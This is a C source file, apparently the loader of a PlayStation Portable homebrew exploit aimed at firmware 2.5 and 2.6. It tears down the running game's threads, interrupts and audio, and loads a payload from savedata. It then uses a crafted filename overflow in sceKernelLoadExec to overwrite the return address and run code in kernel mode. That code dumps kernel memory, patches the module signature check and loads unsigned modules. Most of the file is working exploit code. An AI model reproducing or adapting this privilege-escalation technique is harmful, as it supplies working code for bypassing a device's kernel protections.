  //dlog2hex8("About to delete semas: ", count);
	for (i=0; i<count; i++)
	{
		lrc = sceKernelDeleteSema(ids[i]);
		if (lrc >= 0)
		{
			dlog2hex8("Deleted Sema: ",ids[i]);
		}// else dlog2hex8("Error deleting Sema: ",ids[i]);
	}
}

void DeleteAllEventFlags()
{
	int ids[64];
	int i, lrc, count;

	count=0;
	sceKernelGetThreadmanIdList(SCE_KERNEL_TMID_EventFlag, ids, sizeof(ids) * sizeof(int), &count);

	for (i=0; i<count; i++)
	{
		lrc = sceKernelDeleteEventFlag(ids[i]);
		if (lrc >= 0)
		{
			dlog2hex8("Deleted EventFlag: ",ids[i]);
		}// else dlog2hex8("Error deleting EventFlag: ",ids[i]);
	}
}

void DisableVBlanks()
{
	int lreturn;
	
	// PSP_VBLANK_INT PSP_DISPLAY_SUBINT
	lreturn = sceKernelDisableSubIntr(30, 30);        dlog2hex8("disable vblank_int returned: ",lreturn);
	sceKernelDelayThread(200000);
	lreturn = sceKernelReleaseSubIntrHandler(30, 30); dlog2hex8("release vblank_int returned: ",lreturn);
}

void DisableGeInterrupt()
{
	int lreturn,i,j;
	
	// PSP_VBLANK_INT, PSP_SYSTIMER0_INT
	lreturn = sceKernelDisableSubIntr(30, 15);        dlog2hex8("disable ge_int returned: ",lreturn);
	sceKernelDelayThread(200000);
	lreturn = sceKernelReleaseSubIntrHandler(30, 15); dlog2hex8("release ge_int returned: ",lreturn);
}

void ReleaseAudioChannels()
{
	sceAudioChRelease( 0 );
	sceAudioChRelease( 1 );
	sceAudioChRelease( 2 );
	sceAudioChRelease( 3 );
	sceAudioChRelease( 4 );
	sceAudioChRelease( 5 );
	sceAudioChRelease( 6 );
	sceAudioChRelease( 7 );	
}

void DumpMem()
{
	int handle;
	handle = sceIoOpen("ms0:/GTADUMP.BIN", O_WRONLY|O_CREAT|O_TRUNC, 0777);
	sceIoWrite(handle, 0x08400000, 0x01C00000);
	sceIoClose(handle);
}

void clear_words(unsigned int* start, unsigned int* end)
{
	unsigned int* replace = start;
	int i;

	for (i = 0;&replace[i]<end;i++)
	{
		replace[i]   = 0x0;
	}
}

// Loader thread
int LoaderThread(SceSize args, void *argp)
{
	return run_loader();
}

#if RUN_KERNEL_PROC==1

#if KERNEL_PROC_IS_DUMP==1
void kernel_dump(void)
{
	// Dump'em all - read access
	int handle = sceIoOpen("ms0:/boot.BIN", O_WRONLY | O_CREAT | O_TRUNC, 0777);
	sceIoWrite(handle, (void*) 0xBFC00000 , 0x100000);
	sceIoClose(handle);
	handle = sceIoOpen("ms0:/kmem.BIN", O_WRONLY | O_CREAT | O_TRUNC, 0777);
	sceIoWrite(handle, (void*) 0x88000000 , 0x400000);
	sceIoClose(handle);
	handle = sceIoOpen("ms0:/klib.BIN", O_WRONLY | O_CREAT | O_TRUNC, 0777);
	sceIoWrite(handle, (void*) 0x88800000 , 0x100000);
	sceIoClose(handle);

	// Check if we have write access
	unsigned int *probe = (unsigned int *) 0x883EFC40;
	probe[0] = 0x12345678;
	
	// This file must contain 0x12345678
	handle = sceIoOpen("ms0:/writeaccess.BIN", O_WRONLY | O_CREAT | O_TRUNC, 0777);
	sceIoWrite(handle, probe, 4);
	sceIoClose(handle);

	probe[0] = 0;

	for(;;) { }
}
#else

typedef void (* pfnvoid) (void);

void kernel_proc(void) {

	flashscreen(0, 0x0000FF00);
#if LOAD_CHECKEXEC_BIN==1
	{
		int handle = sceIoOpen("ms0:/checkexec.bin", O_RDONLY, 0777);
		if (handle < 0)
		{
			flashscreen(0, 0x000000FF);
		}
		else
		{
			sceIoRead(handle, 0x883f0000, 10000);
			sceIoClose(handle);

			clearCache();

			flashscreen(0x00ff0000, 0x000000FF);
			// call the checkexec patcher
			pfnvoid func = (pfnvoid*) 0x883f0000;
			func();

			flashscreen(0, 0x0000ffFF);
		}
	}
#endif

#if 1							 // try loading modules from kmode

#if 0
	dlog("patch k0");
	__asm__ volatile (
	"or    $26, $0, $0;\n\t"
	"nop;\n\t"
	:  : : "$26"  );
#endif

#if 1
	dlog("patch k1");
	__asm__ volatile (
	"or    $27, $0, $0;\n\t"
	"nop;\n\t"
	:  : : "$27"  );
#endif

	// attempt a loadexec
	{
		int luid;
		int handle;

		dlog("loadexec module");
		// try loading an ELF
		luid = sceKernelLoadExec("ms0:/kernel.prx", NULL);
		if (luid < 0)
		{
			handle = sceIoOpen("ms0:/failexec.trc", O_WRONLY | O_CREAT | O_TRUNC, 0777);
			sceIoWrite(handle, &luid, 4);
			sceIoClose(handle);
		}
	}


	{
		int luid;
		int handle;

		dlog("load module");
		// try loading an ELF
		luid = sceKernelLoadModule("ms0:/psp/game/test_torus/eboot.pbp", 0, NULL);
		if (luid < 0)
		{
			handle = sceIoOpen("ms0:/failload.trc", O_WRONLY | O_CREAT | O_TRUNC, 0777);
			sceIoWrite(handle, &luid, 4);
			sceIoClose(handle);
		}
		else
		{
			dlog("start module");
			luid = sceKernelStartModule(handle, 0, NULL, NULL, NULL);
			if (luid < 0)
			{
				handle = sceIoOpen("ms0:/failstart.trc", O_WRONLY | O_CREAT | O_TRUNC, 0777);
				sceIoWrite(handle, &luid, 4);
				sceIoClose(handle);
			}
		}
	}

	flashscreen(0, 0x00FF0000);

	for (;;);
#endif

	// Now return cleanly from the exploit
	if (gDetectedFirmware == 250)
	{
		// this is the return address for v2.5
		__asm__ volatile ("lui $2, 0x8000\n"
				 "la $4, 0x88065f8c\n"
				 "jr  $4\n"
				 "ori $2, $2, 0x0147\n"
				 );
	}
	else
	{
		// this is the return address for v2.6
		__asm__ volatile ("lui $2, 0x8000\n"
				 "la  $4, 0x88064494\n"
				 "jr  $4\n"
				 "ori $2, $2, 0x0147\n"
				 );
	}

#if 0
	int handle;
	int luid;

	unsigned int *probe;
	
	dlog("check dlog");

#if 1
	dlog("patch module check a");
	// Patch module check
	probe = (unsigned int*) 0x8801A5B4;
	probe[0] = 0;
#endif

#if 0
	dlog("patch k1");
	__asm__ volatile (
	"or    $27, $0, $0;\n\t"
	"nop;\n\t"
	:  : : "$27"  );
#endif

	dlog("load module");
	// try loading an ELF
	luid = _sceKernelLoadModule("ms0:/kernel.elf", 0, NULL);
	if (luid < 0)
	{
		handle = sceIoOpen("ms0:/failload.trc", O_WRONLY | O_CREAT | O_TRUNC, 0777);
		sceIoWrite(handle, &luid, 4);
		sceIoClose(handle);
	}
	else
	{
		dlog("start module");
		luid = sceKernelStartModule(handle, 0, NULL, NULL, NULL);
		if (luid < 0)
		{
			handle = sceIoOpen("ms0:/failstart.trc", O_WRONLY | O_CREAT | O_TRUNC, 0777);
			sceIoWrite(handle, &luid, 4);
			sceIoClose(handle);
		}
	}

	for(;;) { }
#endif
}
#endif
#endif

int run_loader()
{
	SceUID lblockid  = 0;
	SceSize free_mem = 0;
	int fd;
	int lreturn,i;
  int lret;
  LOADERMAINFUNC loader_main;
  int lfirmware;
  int lsp;

  if (numfailed > 0)
  {
    dlog("Failed to resolve some NIDs:");
    for (i=0; i < numfailed; i++)
    {
      dlog2hex8("Failed NID: ", failednids[i]);
    }
  }

  lfirmware = gDetectedFirmware;

  dlog2hex8("lfirm: ", lfirmware);
  dlog2hex8("firmware: ", gDetectedFirmware);

  asm ("move %0, $29" : "=r" (lsp) : "r" (lsp));
  dlog2hex8("My stack: ", lsp);

  /***************************************************************************/
  /* Quick test of syscall finder                                            */
  /***************************************************************************/
  dlog2hex8("Syscall for 0x237dbd4f: ", findKnownSyscall(0x237dbd4fL));
  dlog2hex8("Detected firmware: ", gDetectedFirmware);

	dlog2hex8("tot free mem:",sceKernelTotalFreeMemSize());
	dlog2hex8("max free mem:",sceKernelMaxFreeMemSize());

#if 0
	sceUmdUnRegisterUMDCallBack(); dlog("Unregister UMD CallBack");
	scePowerUnregisterCallback();  dlog("Unregister Power CallBack");

	dlog2hex8("tot free mem post unregister:",sceKernelTotalFreeMemSize());
	dlog2hex8("max free mem post unregister:",sceKernelMaxFreeMemSize());	
#endif

	DeleteAllThreads();     dlog("Removed Threads");	
	DeleteAllCallbacks();   dlog("Removed Callbacks");
	DeleteAllFpls();        dlog("Removed FPLs");
	DeleteAllSemas();       dlog("Removed Semas");
	DisableVBlanks();       dlog("Disabled VBlanks");
	DisableGeInterrupt();   dlog("Disabled Ge interrupt");
	ReleaseAudioChannels(); dlog("Released AudioChannels");
	//sceKernelDelayThread(1000000);

	dlog2hex8("tot free mem post cleanup:",sceKernelTotalFreeMemSize());
	dlog2hex8("max free mem post cleanup:",sceKernelMaxFreeMemSize());

	// we own it all!!:
	// loader:    09EFD000 - 09FE5000 (0.5mb)

#define LOADER_CODE_START   LOADADDR
#define LOADER_CODE_SIZE    0x00080000

	lblockid = sceKernelAllocPartitionMemory(2,"loader",2,LOADER_CODE_SIZE,LOADER_CODE_START);
	if (lblockid >= 0)
	{
    /*************************************************************************/
    /* Double-check that we allocated the block we wanted                    */
    /*************************************************************************/
    unsigned long lblockaddr = sceKernelGetBlockHeadAddr(lblockid);
    if (lblockaddr != LOADER_CODE_START)
    {
      dlog("Loader code block not at expected addr!");
			sceKernelExitGame();
    }

    dlog2hex8("lfirm: ", lfirmware);
    dlog2hex8("firmware: ", gDetectedFirmware);

#if RUN_KERNEL_PROC==0
    fd = sceIoOpen("ms0:/psp/savedata/ulus10041s5/" RUNFILE, O_RDONLY, 0777);
    if (fd < 0)
    {
      dlog2hex8("failed us, fd: ", fd);
      fd = sceIoOpen("ms0:/psp/savedata/ules00151s5/" RUNFILE, O_RDONLY, 0777);
      if (fd < 0)
      {
        dlog2hex8("failed eu, fd: ", fd);
        fd = sceIoOpen("ms0:/psp/savedata/ules00182s5/" RUNFILE, O_RDONLY, 0777);
        if (fd < 0)
        {
          dlog2hex8("failed de, fd: ", fd);
          sceKernelExitGame();
        }
      }
    }
#endif

    dlog2hex8("fd: ", fd);

		fillvideo(0x00000000);

		clearCache();
		sceIoRead(fd, LOADADDR | 0x40000000, LOADER_CODE_SIZE);
		clearCache();
		sceIoClose(fd);

    flashscreen(0, 0);

#if TEST_SAVEDATA==1
		// Quick test of savedata API
		{
			int lstatus = sceUtilitySavedataGetStatus();
			int i;

			dlog2hex8("Savedata status 1: ", lstatus);

			for (i = 0; i < 10; i++)
			{
				dlog2hex8("Status loop: ", i);

				lstatus = sceUtilitySavedataGetStatus();
				dlog2hex8("Savedata status: ", lstatus);
			}

			lstatus = sceUtilitySavedataShutdownStart();
			dlog2hex8("Shutdown returned: ", lstatus);

			for (i = 0; i < 10; i++)
			{
				dlog2hex8("Status loop: ", i);

				lstatus = sceUtilitySavedataGetStatus();
				dlog2hex8("Savedata status: ", lstatus);
			}
		}
#endif

    loader_main = LOADADDR + 0x4;

#if RUN_KERNEL_PROC==1
		{
		// RUN KERNEL_PROC VIA HITCHHIKR'S HACK
			int i;
				int handle;

				dlog("Call internal code at 0x09EFD004");
			char filename[256];
			unsigned int *dwfilename;
			// This address must *NOT* contains a 00
			unsigned int *loop = (unsigned int *) 0x9efd004;
#if KERNEL_PROC_IS_DUMP==1
			unsigned int *loopsrc = (unsigned int *) &kernel_dump;
#else
			unsigned int *loopsrc = (unsigned int *) &kernel_proc;
#endif
			char *msg = "chhikr hitchhikr hitchhikr hitchhikr hitchik";

			sceKernelDcacheWritebackAll();

			// Copy the test code into a safe place
			for(i = 0; i < 1000; i++) {
				loop[i] = loopsrc[i];
			}
			memset(filename, 0, sizeof(filename));
			// Fill it with shit (*MUST* be 44 bytes)
			for(i = 0; i < 44; i++) {
				filename[i] = msg[i];
			}
			// Own the $ra
			dwfilename = (unsigned int *) &filename[44];
			dwfilename[0] = (unsigned int) loop;
			// Complete the string
			filename[48] = ':';
			filename[49] = '\0';

			// We need this for some odd flushing (?) reasons
			handle = sceIoOpen("ms0:/odd.BIN", O_WRONLY | O_CREAT | O_TRUNC, 0777);
			sceIoWrite(handle, dwfilename, 4);
			sceIoClose(handle);

			sceKernelLoadExec(filename, NULL); 	

			flashscreen(0, 0xffffffff);				 // white flash is a return from the patch

			// attempt a loadexec
			{
				int luid;
				int handle;

				dlog("loadexec module");
				// try loading an ELF
				luid = sceKernelLoadExec("ms0:/kernel.prx", NULL);
				if (luid < 0)
				{
					handle = sceIoOpen("ms0:/failexec.trc", O_WRONLY | O_CREAT | O_TRUNC, 0777);
					sceIoWrite(handle, &luid, 4);
					sceIoClose(handle);
				}
			}


			{
				int luid;
				int handle;

				dlog("load module");
				// try loading an ELF
				luid = sceKernelLoadModule("ms0:/psp/game/test_torus/eboot.pbp", 0, NULL);
				if (luid < 0)
				{
					handle = sceIoOpen("ms0:/failload.trc", O_WRONLY | O_CREAT | O_TRUNC, 0777);
					sceIoWrite(handle, &luid, 4);
					sceIoClose(handle);
				}
				else
				{
					dlog("start module");
					luid = sceKernelStartModule(handle, 0, NULL, NULL, NULL);
					if (luid < 0)
					{
						handle = sceIoOpen("ms0:/failstart.trc", O_WRONLY | O_CREAT | O_TRUNC, 0777);
						sceIoWrite(handle, &luid, 4);
						sceIoClose(handle);
					}
				}
			}

			flashscreen(0, 0x00FF0000);
		}
#else
		// LOAD ELOADER VIA HITCHHIKR's HACK
		{
			int i;
		  int handle;
			char filename[256];
			unsigned int *dwfilename;

			char *msg = "chhikr hitchhikr hitchhikr hitchhikr hitchik";

			dlog("Call code at 0x09EFD004");
			sceKernelDcacheWritebackAll();

			memset(filename, 0, sizeof(filename));
			// Fill it with shit (*MUST* be 44 bytes)
			for(i = 0; i < 44; i++) {
				filename[i] = msg[i];
			}
			// Own the $ra
			dwfilename = (unsigned int *) &filename[44];
			dwfilename[0] = (unsigned int) loader_main;
			// Complete the string
			filename[48] = ':';
			filename[49] = '\0';

			// We need this for some odd flushing (?) reasons
			handle = sceIoOpen("ms0:/odd.BIN", O_WRONLY | O_CREAT | O_TRUNC, 0777);
			sceIoWrite(handle, dwfilename, 4);
			sceIoClose(handle);

			sceKernelLoadExec(filename, NULL); 	
			return(0);
		}
#endif

	} else dlog("Error - Couldn't alloc memory for loader bin!");
	
	sceKernelExitGame();
	
	return lret;
}

int main(void)
{
  int lret;
  int i;

#if LOG_NIDS
	clear_dlog();
#endif

	// setup the nids
	initial_setup(USER_PARTITION_START, USER_PARTITION_LENGTH);

#if !LOG_NIDS
	clear_dlog();
#endif

  dlog("Clear cache");
  clearCache();

  dlog("Create thread");
	int thid = sceKernelCreateThread("loader_thread", LoaderThread, 0x11, 0x1000, 0, 0);
	if (thid >= 0)
	{
		sceKernelStartThread(thid, 0, 0);

		while (1)
		{
			sceKernelDelayThread(30000000);
		}
			
	} else dlog("Error - Couldn't start loader thread!");

	sceKernelExitGame();
	
	return lret;
}	
